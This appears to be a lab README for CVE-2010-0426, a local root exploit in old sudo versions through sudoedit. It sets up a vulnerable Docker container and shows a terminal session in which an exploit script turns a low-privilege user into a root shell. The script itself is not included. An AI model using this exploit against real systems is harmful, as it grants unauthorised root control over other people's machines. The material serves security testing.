# Sudo 1.6.x<=1.6.9p21 and 1.7.x<=1.7.2p4 Local Privilege Escalation

Sudo (su "do") allows a system administrator to give certain users (or groups of users) the ability to run some (or all) commands as root while logging all commands and arguments.

## Vulnerable environment

To setup a vulnerable environment for your test you will need [Docker](https://docker.com) installed, and just run the following command:

    docker build -t vul-linux .
    docker run --rm -it vul-linux

And it will spawn a interactive shell with low user privileges.

## Vulnerable code

The bug was found in sudoedit, which does not handle the 'sudoedit' command correctly, this allows a malicious user to replace the real sudoedit command with an arbitrary command.

Local attackers could exploit this issue to run arbitrary commands as the 'root' user. Successful exploits can completely compromise an affected computer.

## Exploit

To exploit this target just run:

    ./exploit.sh

If you are using this vulnerable image, you can just run:

	user@023b47ff82ca:~$ sudo -V
	Sudo version 1.7.2
	user@023b47ff82ca:~$ sudo -l
	User user may run the following commands on this host:
		(root) NOPASSWD: sudoedit /etc/fstab
	user@023b47ff82ca:~$ ./exploit.sh /etc/fstab
	[+] CVE-2010-0426 exploit by t0kx
	[+] Prepared sudoedit...
	[+] Run sudoedit
	root@023b47ff82ca:/tmp# id
	uid=0(root) gid=0(root) groups=0(root)
	root@023b47ff82ca:/tmp#


